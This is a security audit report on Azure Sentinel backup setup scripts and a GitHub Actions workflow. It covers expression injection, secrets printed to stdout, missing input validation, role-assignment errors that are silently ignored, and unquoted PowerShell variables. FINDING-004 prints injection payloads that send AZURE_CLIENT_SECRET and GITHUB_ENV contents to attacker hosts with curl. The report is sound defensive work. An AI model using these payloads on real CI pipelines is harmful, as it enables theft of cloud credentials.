# Security Findings

## [MEDIUM] FINDING-004: GitHub Actions Expression Injection via workflow_dispatch Inputs

| Field         | Value                                           |
|---------------|-------------------------------------------------|
| Severity      | MEDIUM                                          |
| CWE           | CWE-78: Improper Neutralization of Special Elements used in an OS Command |
| OWASP         | A03:2021 — Injection                            |
| File(s)       | configure_gh_workflow.sh, configure_gh_workflow.ps1 |
| Line(s)       | (generated workflow template — restore workflow `run:` blocks) |
| Introduced By | Initial implementation                          |

**Description**
The generated `sentinel-restore.yml` workflow uses `${{ github.event.inputs.restore_flags }}`, `${{ github.event.inputs.generate_new_id }}`, and `${{ github.event.inputs.logic_app_mode }}` directly inside `run:` shell blocks. GitHub Actions interpolates `${{ }}` expressions *before* the shell executes, so a malicious value in `restore_flags` (e.g., `'; curl attacker.com/exfil?t=$(cat $GITHUB_ENV); echo '`) would execute arbitrary commands. While `workflow_dispatch` requires repository write access to trigger, this still represents a command injection vector — especially in repositories with multiple collaborators.

**Proof of Concept**
An attacker with write access to the repository triggers the workflow via the GitHub API with:
```json
{
  "ref": "main",
  "inputs": {
    "restore_flags": "'; echo $AZURE_CLIENT_SECRET > /tmp/secret; curl https://attacker.example.com --data-binary @/tmp/secret; echo '"
  }
}
```
The `${{ github.event.inputs.restore_flags }}` expression is interpolated into the shell script, executing the injected commands before the validation step can check the value.

**Impact**
An attacker with repository write access could exfiltrate GitHub Environment secrets (`AZURE_CLIENT_SECRET`, etc.) or execute arbitrary code in the workflow runner context.

**Remediation**
Move all `${{ github.event.inputs.* }}` references from `run:` blocks into `env:` blocks. Environment variables are set by the runner before shell execution and are not subject to expression injection. Reference them via `$VARNAME` in shell commands instead.

---

## [MEDIUM] FINDING-005: Client Secret Printed to Stdout in Setup Scripts

| Field         | Value                                           |
|---------------|-------------------------------------------------|
| Severity      | MEDIUM                                          |
| CWE           | CWE-532: Insertion of Sensitive Information into Log File |
| OWASP         | A07:2021 — Identification and Authentication Failures |
| File(s)       | setup/setup_backup.sh, setup/setup_backup.ps1   |
| Line(s)       | Bash L234–L270, PowerShell L205–L265            |
| Introduced By | 2026-03-27 setup script creation                |

**Description**
Both setup scripts print the generated `AZURE_CLIENT_SECRET` in plaintext to the terminal as part of a formatted credentials box, and again in a `.env` template block. The secret value is fully visible on screen and captured in terminal scrollback, shell history logs, CI/CD pipeline logs, and screenshots. Terminal multiplexers (tmux, screen) and recording tools also capture it.

**Proof of Concept**
```bash
$ ./setup/setup_backup.sh --app-name Test --subscription-id ... --resource-group ... --workspace-name ...
# Output includes:
# ║  AZURE_CLIENT_SECRET   = aB3~xYz...actual_secret_value_here
```
The secret is fully readable in terminal output and persists in scrollback.

**Impact**
Anyone with access to terminal history, log files, CI/CD logs, or screenshots can obtain the client secret, leading to unauthorised access to the Azure App Registration and all resources it has Reader/Sentinel Reader permissions on.

**Remediation**
Write credentials to a file with restrictive permissions (600/owner-only) instead of printing the secret to stdout. Display only the file path and a warning, not the secret itself.

---

## [MEDIUM] FINDING-006: Missing Input Validation on Azure Resource Names

| Field         | Value                                           |
|---------------|-------------------------------------------------|
| Severity      | MEDIUM                                          |
| CWE           | CWE-20: Improper Input Validation               |
| OWASP         | A03:2021 — Injection                            |
| File(s)       | setup/setup_backup.sh, setup/setup_backup.ps1   |
| Line(s)       | Bash L140–L158, PowerShell L108–L120            |
| Introduced By | 2026-03-27 setup script creation                |

**Description**
The setup scripts accept subscription IDs, resource group names, and workspace names from interactive prompts or CLI arguments without validating them against Azure naming conventions. These values are passed directly to `az` CLI commands. While `az` itself rejects invalid names, the lack of client-side validation means malformed input (containing newlines, shell metacharacters, or path separators) reaches the command invocation. In bash, variables are properly quoted, but subscription IDs should be validated as UUIDs and resource group names should conform to `^[a-zA-Z0-9._-]+$`.

**Proof of Concept**
```bash
./setup/setup_backup.sh --subscription-id "not-a-uuid" --resource-group "rg with spaces" --workspace-name "ws"
# Script proceeds to make Azure CLI calls with invalid values
# az account set --subscription "not-a-uuid"  → fails at Azure, not at input
```

**Impact**
Confusing error messages from Azure instead of clear validation feedback. In edge cases with crafted input from non-interactive sources, could cause unintended behaviour in `az` CLI command parsing.

**Remediation**
Add input validation functions: validate subscription IDs as UUIDs (`^[0-9a-fA-F-]{36}$`) and resource names against Azure naming rules (`^[a-zA-Z0-9][a-zA-Z0-9._-]*$`). Reject invalid input before making any Azure API calls.

---

## [MEDIUM] FINDING-007: Role Assignment Failures Silently Ignored

| Field         | Value                                           |
|---------------|-------------------------------------------------|
| Severity      | MEDIUM                                          |
| CWE           | CWE-280: Improper Handling of Insufficient Permissions or Privileges |
| OWASP         | A01:2021 — Broken Access Control                |
| File(s)       | setup/setup_backup.sh, setup/setup_backup.ps1   |
| Line(s)       | Bash L240–L252, PowerShell L216–L228            |
| Introduced By | 2026-03-27 setup script creation                |

**Description**
The `assign_role` function in both scripts redirects stderr to `/dev/null` and appends `|| true` (bash) or ignores errors from `az role assignment create` (PowerShell). If the calling user lacks Owner/User Access Administrator rights, or the scope is invalid, role assignments silently fail. The script reports success even when the App Registration has no permissions, giving a false sense of security.

**Proof of Concept**
```bash
# User who is only a Reader on the subscription runs:
./setup/setup_backup.sh ...
# Output:
#   Assigning Reader (workspace RG)...
#   Assigning Microsoft Sentinel Reader (workspace RG)...
#   RBAC assignments complete.    ← reports success
# But no role was actually assigned; az returned non-zero exit code, which was discarded
```

**Impact**
The App Registration appears fully configured but has no RBAC permissions. Backup operations fail at runtime with 403 errors, with no link back to the setup step that silently failed.

**Remediation**
Check the exit code of each `az role assignment create` call. If it fails, check whether the role is already assigned (idempotent case). If neither succeeds, report a clear warning to the user indicating which role assignment failed and what permissions are needed to assign it.

---

## [LOW] FINDING-008: PowerShell Variables Unquoted in Azure CLI Calls

| Field         | Value                                           |
|---------------|-------------------------------------------------|
| Severity      | LOW                                             |
| CWE           | CWE-78: Improper Neutralization of Special Elements used in an OS Command |
| OWASP         | A03:2021 — Injection                            |
| File(s)       | setup/setup_backup.ps1                          |
| Line(s)       | L133, L140–L145, L157, L170, L191–L196         |
| Introduced By | 2026-03-27 setup script creation                |

**Description**
Several `az` CLI invocations in the PowerShell script pass variables without double-quote wrapping: `az account set --subscription $SubscriptionId`, `az ad app list --display-name $AppName`, `az ad sp show --id $AppId`, etc. Although PowerShell generally handles simple variable expansion safely, values containing spaces, special characters, or embedded subexpressions may be misinterpreted. The bash counterpart correctly quotes all variables.

**Proof of Concept**
```powershell
.\setup_backup.ps1 -AppName "My App Registration"
# Expands to: az ad app list --display-name My App Registration
# az interprets "My", "App", "Registration" as separate arguments
```

**Impact**
App names containing spaces cause incorrect `az` CLI behaviour. Other values (subscription IDs, resource groups) are less likely to contain spaces but quoting is a defensive best practice.

**Remediation**
Wrap all variable references in double quotes when passed to `az` CLI commands, matching the bash script's quoting pattern.

---

## Summary

| ID          | Title                                                     | Severity | Status |
|-------------|-----------------------------------------------------------|----------|--------|
| FINDING-001 | Client Secret CLI Exposure Warning                        | MEDIUM   | FIXED  |
| FINDING-002 | Mask Sensitive Input in Configuration Scripts             | LOW      | FIXED  |
| FINDING-003 | Pin Dependency Version Upper Bounds                       | LOW      | FIXED  |
| FINDING-004 | GitHub Actions Expression Injection via workflow_dispatch | MEDIUM   | FIXED  |
| FINDING-005 | Client Secret Printed to Stdout in Setup Scripts          | MEDIUM   | FIXED  |
| FINDING-006 | Missing Input Validation on Azure Resource Names          | MEDIUM   | FIXED  |
| FINDING-007 | Role Assignment Failures Silently Ignored                 | MEDIUM   | FIXED  |
| FINDING-008 | PowerShell Variables Unquoted in Azure CLI Calls          | LOW      | FIXED  |
